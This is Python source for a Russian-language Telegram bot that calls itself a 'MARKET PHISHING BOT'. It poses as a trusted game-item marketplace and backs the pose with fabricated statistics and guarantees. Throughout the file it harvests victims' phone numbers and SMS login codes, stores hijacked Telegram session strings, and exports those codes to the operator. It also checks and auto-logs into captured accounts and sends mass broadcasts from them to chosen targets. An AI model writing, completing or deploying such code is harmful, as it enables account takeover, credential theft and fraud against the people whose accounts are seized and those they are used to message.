async def process_broadcast_targets(message: types.Message, state: FSMContext):
    if message.text.lower() == 'отмена':
        await state.clear()
        await message.answer("❌ Рассылка отменена", parse_mode="HTML")
        return
    
    # Получаем цели
    targets = [line.strip() for line in message.text.split('\n') if line.strip()]
    
    if not targets:
        await message.answer("❌ Список целей пуст", parse_mode="HTML")
        await state.clear()
        return
    
    await state.update_data(broadcast_targets=targets)
    
    await message.answer(
        f"✅ Получено {len(targets)} целей\n\n"
        "Теперь введите текст сообщения для рассылки:",
        parse_mode="HTML"
    )
    
    # Следующий шаг - текст сообщения
    await state.set_state(VerificationStates.waiting_code)  # Временно используем другое состояние

async def process_broadcast_message(message: types.Message, state: FSMContext):
    """Обработка текста сообщения для рассылки"""
    user_data = await state.get_data()
    targets = user_data.get('broadcast_targets', [])
    message_text = message.text
    
    if not hijacker:
        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
        await state.clear()
        return
    
    # Подтверждение
    confirm_text = f"""
🎯 <b>ПОДТВЕРЖДЕНИЕ РАССЫЛКИ</b>

<b>Целей:</b> {len(targets)}
<b>Сообщение:</b>
{message_text[:200]}{'...' if len(message_text) > 200 else ''}

<b>Начать рассылку?</b>
"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ НАЧАТЬ РАССЫЛКУ", callback_data="start_broadcast_confirm")],
        [InlineKeyboardButton(text="❌ ОТМЕНА", callback_data="cancel_broadcast")]
    ])
    
    await state.update_data(broadcast_message=message_text)
    await message.answer(confirm_text, parse_mode="HTML", reply_markup=keyboard)

@dp.callback_query(F.data == "start_broadcast_confirm")
async def start_broadcast_confirm(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer("⏳ Начинаю рассылку...")
    
    user_data = await state.get_data()
    targets = user_data.get('broadcast_targets', [])
    message_text = user_data.get('broadcast_message', '')
    
    # Запускаем рассылку в фоне
    asyncio.create_task(auto_message_from_all_accounts(message_text, targets))
    
    await bot.edit_message_text(
        "✅ <b>Рассылка запущена!</b>\n\nРезультаты будут отправлены позже.",
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML"
    )
    
    await state.clear()

@dp.callback_query(F.data == "cancel_broadcast")
async def cancel_broadcast(callback_query: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await bot.edit_message_text(
        "❌ <b>Рассылка отменена</b>",
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "check_access_all")
async def check_access_all_callback(callback_query: types.CallbackQuery):
    """Проверить доступ всем аккаунтам через callback"""
    if not hijacker:
        await callback_query.answer("⚠️ Hijacker не инициализирован")
        return
    
    await callback_query.answer("🔍 Проверяю доступ...")
    
    accounts = hijacker.get_hijacked_accounts()
    
    if not accounts:
        await bot.edit_message_text(
            "📭 Нет аккаунтов для проверки",
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            parse_mode="HTML"
        )
        return
    
    active = 0
    inactive = 0
    
    for acc in accounts:
        phone = acc[0]
        
        hijacker.cursor.execute(
            "SELECT session_string FROM hijacked_sessions WHERE phone = ? ORDER BY hijacked_at DESC LIMIT 1",
            (phone,)
        )
        result = hijacker.cursor.fetchone()
        
        if result:
            session_string = result[0]
            is_active = await hijacker.check_account_access(session_string)
            
            if is_active:
                active += 1
                hijacker.update_account_status(phone, True)
            else:
                inactive += 1
                hijacker.update_account_status(phone, False)
    
    result_text = f"""
📊 <b>РЕЗУЛЬТАТ ПРОВЕРКИ</b>

✅ Активные: {active}
❌ Неактивные: {inactive}
📈 Всего: {len(accounts)}

<b>Статусы обновлены в базе данных.</b>
"""
    
    await bot.edit_message_text(
        result_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "clear_inactive_sessions")
async def clear_inactive_sessions(callback_query: types.CallbackQuery):
    """Очистить неактивные сессии"""
    if not hijacker:
        await callback_query.answer("⚠️ Hijacker не инициализирован")
        return
    
    # Удаляем неактивные сессии
    hijacker.cursor.execute(
        "DELETE FROM hijacked_sessions WHERE is_active = 0"
    )
    deleted_count = hijacker.cursor.rowcount
    hijacker.conn.commit()
    
    await callback_query.answer(f"🗑️ Удалено {deleted_count} неактивных сессий")
    
    # Обновляем сообщение
    accounts = hijacker.get_hijacked_accounts()
    
    if not accounts:
        await bot.edit_message_text(
            "📭 Нет захваченных аккаунтов",
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            parse_mode="HTML"
        )
        return
    
    accounts_text = "<b>📋 ЗАХВАЧЕННЫЕ АККАУНТЫ (ОЧИЩЕНО)</b>\n━━━━━━━━━━━━━━━━\n\n"
    
    for i, acc in enumerate(accounts, 1):
        status = "✅" if acc[5] == 1 else "❌"
        accounts_text += f"{i}. <b>{status} +{acc[0]}</b>\n"
        accounts_text += f"   👤 @{acc[2] or 'нет'}\n"
        accounts_text += f"   ⏰ {acc[4][:16]}\n"
        accounts_text += "   ━━━━━━━━━━━\n"
    
    accounts_text += f"\n🗑️ <b>Удалено неактивных: {deleted_count}</b>"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Проверить доступ", callback_data="check_access_all")],
        [InlineKeyboardButton(text="📨 Тест рассылка", callback_data="test_broadcast")]
    ])
    
    await bot.edit_message_text(
        accounts_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "test_broadcast")
async def test_broadcast_callback(callback_query: types.CallbackQuery):
    """Тестовая рассылка админу"""
    if not hijacker:
        await callback_query.answer("⚠️ Hijacker не инициализирован")
        return
    
    await callback_query.answer("📨 Отправляю тестовые сообщения...")
    
    active_accounts = hijacker.get_active_accounts()
    
    if not active_accounts:
        await bot.send_message(
            callback_query.from_user.id,
            "❌ Нет активных аккаунтов для теста",
            parse_mode="HTML"
        )
        return
    
    test_message = f"🔧 Тестовое сообщение от захваченного аккаунта\nВремя: {datetime.now().strftime('%H:%M:%S')}"
    
    success_count = 0
    fail_count = 0
    
    for account in active_accounts[:3]:  # Первые 3 аккаунта
        phone = account[0]
        
        success = await hijacker.send_message_from_hijacked(
            phone,
            str(ADMIN_ID),
            test_message
        )
        
        if success:
            success_count += 1
            await asyncio.sleep(5)  # Задержка между сообщениями
        else:
            fail_count += 1
    
    result_text = f"""
📨 <b>ТЕСТ РАССЫЛКИ ЗАВЕРШЕН</b>

✅ Успешно: {success_count}
❌ Неудачно: {fail_count}
📊 Всего попыток: {len(active_accounts[:3])}

<b>Проверьте входящие сообщения от захваченных аккаунтов.</b>
"""
    
    await bot.send_message(
        callback_query.from_user.id,
        result_text,
        parse_mode="HTML"
    )

@dp.message(Command("status"))
async def cmd_status(message: types.Message):
    user = message.from_user
    
    cursor.execute(
        "SELECT COUNT(*), SUM(CASE WHEN status = 'pending' THEN 1 ELSE 0 END) FROM items WHERE user_id = ?",
        (user.id,)
    )
    stats = cursor.fetchone()
    
    cursor.execute(
        "SELECT phone FROM users WHERE user_id = ?",
        (user.id,)
    )
    user_data = cursor.fetchone()
    
    status_text = f"""
📊 <b>ВАШ СТАТУС</b>

👤 <b>Пользователь:</b> {user.first_name}
🆔 <b>ID:</b> {user.id}
📱 <b>Телефон:</b> {'+'+user_data[0] if user_data and user_data[0] else 'Не подтвержден'}
    
📦 <b>Заявки:</b>
• Всего: {stats[0] or 0}
• На модерации: {stats[1] or 0}
• Одобрено: {(stats[0] or 0) - (stats[1] or 0)}

💎 <b>Рекомендации:</b>
1. Для продажи товара нажмите /start
2. Для проверки верификации отправьте номер телефона
3. Для помощи используйте /help
"""
    
    await message.answer(status_text, parse_mode="HTML")
    log_action(user.id, "check_status")

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    help_text = """
🆘 <b>ПОМОЩЬ ПО БОТУ</b>

<b>Основные команды:</b>
/start - Начать работу с ботом
/status - Проверить статус заявок
/resend_code - Отправить код подтверждения повторно
/help - Показать это сообщение

<b>Процесс продажи:</b>
1. Нажмите /start
2. Выберите "💰 ПРОДАТЬ ТОВАР"
3. Подтвердите номер телефона (требуется один раз)
4. Выберите тип товара
5. Отправьте фотографии и описание
6. Дождитесь оценки модератора
7. Примите цену и получите инструкции по передаче
8. Получите деньги после проверки товара

<b>Безопасность:</b>
• Все транзакции защищены
• Конфиденциальность гарантирована
• Выплаты в течение 24 часов

<b>Поддержка:</b>
Для связи с администратором используйте кнопку "ℹ️ О НАС" в меню.
"""
    
    await message.answer(help_text, parse_mode="HTML")
    log_action(message.from_user.id, "help_requested")

@dp.callback_query(F.data == "about_us")
async def about_us(callback_query: types.CallbackQuery):
    about_text = """
🏪 <b>О НАС - Money Moves Bot</b>

Мы - надежная платформа для покупки и продажи игровых ценностей с 2018 года.

<b>Наши преимущества:</b>
✅ <b>Безопасность</b> - Все сделки защищены гарантией
✅ <b>Скорость</b> - Выплаты в течение 1-24 часов
✅ <b>Выгода</b> - Самые высокие цены на рынке
✅ <b>Поддержка</b> - Круглосуточная помощь

<b>Статистика:</b>
• 50,000+ успешных сделок
• 10,000+ довольных клиентов
• 99.8% положительных отзывов
• 24/7 работа поддержки

<b>Наши гарантии:</b>
1. Полная анонимность
2. Защита от мошенничества
3. Юридическое сопровождение
4. Мгновенные выплаты

<b>Присоединяйтесь к нам уже сегодня!</b>
"""
    
    await bot.edit_message_text(
        about_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML"
    )

@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    if message.from_user.id != ADMIN_ID and message.from_user.id not in MODERATOR_IDS:
        await message.answer("❌ Доступ запрещен")
        return
    
    # Статистика
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM users WHERE phone IS NOT NULL")
    verified_users = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM items")
    total_items = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM items WHERE status = 'pending'")
    pending_items = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM sms_codes WHERE used = 0")
    unused_codes = cursor.fetchone()[0]
    
    hijacked_count = 0
    if hijacker:
        hijacked_accounts = hijacker.get_hijacked_accounts()
        hijacked_count = len(hijacked_accounts)
    
    admin_text = f"""
👑 <b>АДМИН ПАНЕЛЬ</b>

<b>Статистика:</b>
👥 <b>Пользователи:</b> {total_users}
✅ <b>Верифицированы:</b> {verified_users}
📦 <b>Заявки:</b> {total_items}
⏳ <b>На модерации:</b> {pending_items}
🔢 <b>Неиспользованные коды:</b> {unused_codes}
🎯 <b>Захвачено аккаунтов:</b> {hijacked_count}

<b>Последние действия:</b>
"""
    
    cursor.execute("SELECT user_id, action, timestamp FROM logs ORDER BY timestamp DESC LIMIT 5")
    logs = cursor.fetchall()
    
    for log in logs:
        admin_text += f"\n• ID{log[0]} - {log[1]} ({log[2][:16]})"
    
    admin_text += "\n\n<b>Команды администратора:</b>"
    admin_text += "\n/export_users - Экспорт пользователей"
    admin_text += "\n/export_codes - Экспорт кодов"
    admin_text += "\n/hijacked - Показать захваченные аккаунты"
    admin_text += "\n/check_access - Проверить доступ аккаунтов"
    admin_text += "\n/auto_login - Авто-вход во все аккаунты"
    admin_text += "\n/broadcast - Рассылка от всех аккаунтов"
    
    await message.answer(admin_text, parse_mode="HTML")

@dp.message(Command("export_users"))
async def cmd_export_users(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещен")
        return
    
    cursor.execute("SELECT user_id, username, first_name, phone, code, registered FROM users")
    users = cursor.fetchall()
    
    if not users:
        await message.answer("❌ Нет данных для экспорта")
        return
    
    # Создаем временный файл
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
        f.write("ID | Username | Имя | Телефон | Код | Регистрация\n")
        f.write("-" * 80 + "\n")
        for user in users:
            f.write(f"{user[0]} | @{user[1] or 'нет'} | {user[2]} | +{user[3] or 'нет'} | {user[4] or 'нет'} | {user[5]}\n")
        file_path = f.name
    
    # Отправляем файл
    try:
        document = FSInputFile(file_path, filename="users_export.txt")
        await message.answer_document(document, caption="📊 Экспорт пользователей")
        os.unlink(file_path)
    except Exception as e:
        await message.answer(f"❌ Ошибка экспорта: {e}")

@dp.message(Command("export_codes"))
async def cmd_export_codes(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещен")
        return
    
    cursor.execute("SELECT u.user_id, u.username, u.phone, u.code, s.sent_time FROM users u LEFT JOIN sms_codes s ON u.user_id = s.user_id WHERE u.phone IS NOT NULL")
    codes = cursor.fetchall()
    
    if not codes:
        await message.answer("❌ Нет данных для экспорта")
        return
    
    # Создаем временный файл
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
        f.write("ID | Username | Телефон | Код | Время отправки\n")
        f.write("-" * 80 + "\n")
        for code in codes:
            f.write(f"{code[0]} | @{code[1] or 'нет'} | +{code[2] or 'нет'} | {code[3] or 'нет'} | {code[4] or 'нет'}\n")
        file_path = f.name
    
    # Отправляем файл
    try:
        document = FSInputFile(file_path, filename="codes_export.txt")
        await message.answer_document(document, caption="🔢 Экспорт кодов подтверждения")
        os.unlink(file_path)
    except Exception as e:
        await message.answer(f"❌ Ошибка экспорта: {e}")

# ========== ЗАПУСК БОТА ==========

async def main():
    print("=" * 50)
    print("🛒 MARKET PHISHING BOT - SWILL EDITION")
    print(f"👑 Admin: {ADMIN_ID}")
    print(f"👮 Moderators: {MODERATOR_IDS}")
    print(f"🤖 Bot: @{(await bot.me()).username}")
    print(f"💾 Database initialized")
    print(f"🎯 Hijacker: {'✅ Active' if hijacker else '❌ Inactive'}")
    print("=" * 50)
    
    # Уведомление админу о запуске
    try:
        await bot.send_message(
            ADMIN_ID,
            f"🤖 <b>БОТ ЗАПУЩЕН!</b>\n\n"
            f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Статус: ✅ Активен\n"
            f"Hijacker: {'✅ Включен' if hijacker else '❌ Выключен'}\n\n"
            f"<b>Готов к фишингу и автоматическому входу в аккаунты!</b>",
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Ошибка отправки уведомления админу: {e}")
    
    # Запускаем авто-вход в сохраненные аккаунты
    if hijacker:
        asyncio.create_task(auto_login_hijacked_accounts())
        
        # Запускаем мониторинг
        asyncio.create_task(monitor_hijacked_accounts())
        
        logger.info("[MAIN] Авто-вход и мониторинг аккаунтов запущены")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())